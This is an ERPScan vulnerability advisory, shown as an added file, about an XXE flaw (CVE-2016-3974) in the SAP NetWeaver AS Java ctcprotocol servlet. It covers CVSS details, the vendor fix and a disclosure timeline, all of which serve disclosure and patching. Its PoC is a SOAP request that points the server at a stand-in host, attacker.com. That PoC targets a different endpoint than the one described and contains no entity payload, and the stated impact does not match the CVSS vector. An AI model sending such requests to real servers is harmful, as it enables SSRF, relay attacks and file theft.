@@ -1,0 +1,211 @@
+Application: SAP NetWeaver AS JAVA
+
+Versions Affected: SAP NetWeaver  AS JAVA 7.1 - 7.5
+
+Vendor URL: http://SAP.com
+
+Bug: XXE
+
+Sent:  20.10.2015
+
+Reported: 21.10.2015
+
+Vendor response: 21.10.2015
+
+Date of Public Advisory: 08.03.2016
+
+Reference: SAP Security Note 2235994
+
+Author:  Vahagn Vardanyan  (ERPScan)
+
+
+
+Description
+
+
+1. ADVISORY INFORMATION
+
+Title: [ERPSCAN-16-013] SAP NetWeaver  AS  Java ctcprotocol servlet –
+XXE vulnerability
+
+Advisory ID: [ERPSCAN-16-013]
+
+Risk: Medium
+
+Advisory URL: https://erpscan.com/advisories/erpscan-16-013-sap-netweaver-7-4-ctcprotocol-servlet-xxe/
+
+Date published: 08.03.2016
+
+Vendors contacted: SAP
+
+
+2. VULNERABILITY INFORMATION
+
+Class: XXE
+
+Impact: denial of service
+
+Remotely Exploitable: Yes
+
+Locally Exploitable: No
+
+CVE-2016-3974
+
+
+CVSS Information
+
+CVSS Base Score v3:  6.4  / 10
+
+CVSS Base Vector:
+
+AV : Attack Vector (Related exploit range) Network (N)
+
+AC : Attack Complexity (Required attack complexity) High (H)
+
+PR : Privileges Required (Level of privileges needed to exploit) High (H)
+
+UI : User Interaction (Required user participation) None (N)
+
+S : Scope (Change in scope due to impact caused to components beyond
+the vulnerable component) Unchanged (U)
+
+C : Impact to Confidentiality High (H)
+
+I : Impact to Integrity High (H)
+
+A : Impact to Availability High (H)
+
+
+
+3. VULNERABILITY DESCRIPTION
+
+Authorized attacker can use a special request to read files from the
+server and then escalate his or her privileges.
+
+
+
+4. VULNERABLE PACKAGES
+
+SAP NetWeaver AS JAVA 7.1 - 7.5
+
+Other versions are probably affected too, but they were not checked.
+
+
+5. SOLUTIONS AND WORKAROUNDS
+
+To correct this vulnerability, install SAP Security Note 2235994
+
+
+
+6. AUTHOR
+
+Vahagn Vardanyan  (ERPScan)
+
+
+7. TECHNICAL DESCRIPTION
+
+
+An XML external entity (XXE) vulnerability in the Configuration Wizard
+in SAP NetWeaver Java AS 7.4 allows remote attackers to cause a denial
+of service, conduct SMB Relay attacks, or access arbitrary files via a
+crafted XML request related to the ctcprotocol servlet.
+
+PoC
+
+
+POST /_tc~monitoring~webservice~web/ServerNodesWSService HTTP/1.1
+Content-Type: text/xml
+
+<SOAP-ENV:Envelope
+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+<SOAP-ENV:Body>
+ <m:XXX xmlns:m="http://sap.com/monitoring/ws/sn/">
+  <url>attacker.com</url>
+ </m:XXX>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+
+
+
+
+8. REPORT TIMELINE
+
+Sent:  20.10.2015
+
+Reported: 21.10.2015
+
+Vendor response: 21.10.2015
+
+Date of Public Advisory: 08.03.2016
+
+
+
+
+9. REFERENCES
+
+https://erpscan.com/advisories/erpscan-16-013-sap-netweaver-7-4-ctcprotocol-servlet-xxe/
+
+
+10. ABOUT ERPScan Research
+
+The company’s expertise is based on the research subdivision of
+ERPScan, which is engaged in vulnerability research and analysis of
+critical enterprise applications. It has achieved multiple
+acknowledgments from the largest software vendors like SAP, Oracle,
+Microsoft, IBM, VMware, HP for discovering more than 400
+vulnerabilities in their solutions (200 of them just in SAP!).
+
+ERPScan researchers are proud to have exposed new types of
+vulnerabilities (TOP 10 Web Hacking Techniques 2012) and to be
+nominated for the best server-side vulnerability at BlackHat 2013.
+
+ERPScan experts have been invited to speak, present, and train at 60+
+prime international security conferences in 25+ countries across the
+continents. These include BlackHat, RSA, HITB, and private SAP
+trainings in several Fortune 2000 companies.
+
+ERPScan researchers lead the project EAS-SEC, which is focused on
+enterprise application security research and awareness. They have
+published 3 exhaustive annual award-winning surveys about SAP
+security.
+
+ERPScan experts have been interviewed by leading media resources and
+featured in specialized info-sec publications worldwide. These include
+Reuters, Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading,
+Heise, and Chinabyte, to name a few.
+
+We have highly qualified experts in staff with experience in many
+different fields of security, from web applications and
+mobile/embedded to reverse engineering and ICS/SCADA systems,
+accumulating their experience to conduct the best SAP security
+research.
+
+
+
+11. ABOUT ERPScan
+
+ERPScan is the most respected and credible Business Application
+Security provider. Founded in 2010, the company operates globally and
+enables large Oil and Gas, Financial and Retail organizations to
+secure their mission-critical processes. Named as an ‘Emerging Vendor’
+in Security by CRN, listed among “TOP 100 SAP Solution providers” and
+distinguished by 30+ other awards, ERPScan is the leading SAP SE
+partner in discovering and resolving security vulnerabilities. ERPScan
+consultants work with SAP SE in Walldorf to assist in improving the
+security of their latest solutions.
+
+ERPScan’s primary mission is to close the gap between technical and
+business security, and provide solutions to evaluate and secure SAP
+and Oracle ERP systems and business-critical applications from both,
+cyber-attacks as well as internal fraud. Usually our clients are large
+enterprises, Fortune 2000 companies and managed service providers
+whose requirements are to actively monitor and manage security of vast
+SAP landscapes on a global scale.
+
+We ‘follow the sun’ and function in two hubs, located in the Palo Alto
+and Amsterdam to provide threat intelligence services, agile support
+and operate local offices and partner network spanning 20+ countries
+around the globe.
